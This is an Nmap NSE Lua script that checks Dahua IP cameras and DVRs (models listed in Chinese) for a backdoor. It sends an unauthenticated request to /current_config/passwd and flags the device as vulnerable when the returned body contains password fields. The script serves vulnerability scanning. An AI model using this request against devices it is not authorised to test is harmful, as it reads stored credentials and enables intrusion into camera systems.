local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local string = require "string"


description = [[
大华视频设备后门文件漏洞，影响的设备型号如下:
DH-IPC-HDW23A0RN-ZS
DH-IPC-HDBW23A0RN-ZS
DH-IPC-HDBW13A0SN
DH-IPC-HDW13A0SN
DH-IPC-HFW13A0SN-W
DH-IPC-HDBW13A0SN
DH-IPC-HDW13A0SN
DH-IPC-HFW13A0SN-W
DHI-HCVR51A04HE-S3
DHI-HCVR51A08HE-S3
DHI-HCVR58A32S-S2
]]

author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = { "dahua", "dahua_backdoor", "vuln_detect" }

portrule = shortport.port_or_service( {80, 443, 8080, 8090, 8088}, {"http", "https"}, "tcp", "open")


action = function(host, port)
	local path = "/current_config/passwd"

	local output = stdnse.output_table()

	local options = {header={}}

	options["header"]["Connection"] = "close"
	options["header"]["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
	options["header"]["Accept"] = "*/*"
	options["header"]["X-Requested-With"] = "XMLHttpRequest"
	options["header"]["X-Request"] = "JSON"
	options["header"]["User-Agent"] = "DAHUA-dhdev/1.0"

	local resp = http.get(host, port, path, options)

	if resp.status == 200 then
		if string.find(resp.body, "Password") ~= nil and string.find(resp.body, "Sharable") ~= nil then
			output = "Found vulnerable."
		else
			output = "Not vulnerable."
		end
	else
		output = "Not vulnerable."
	end

	return output

end  

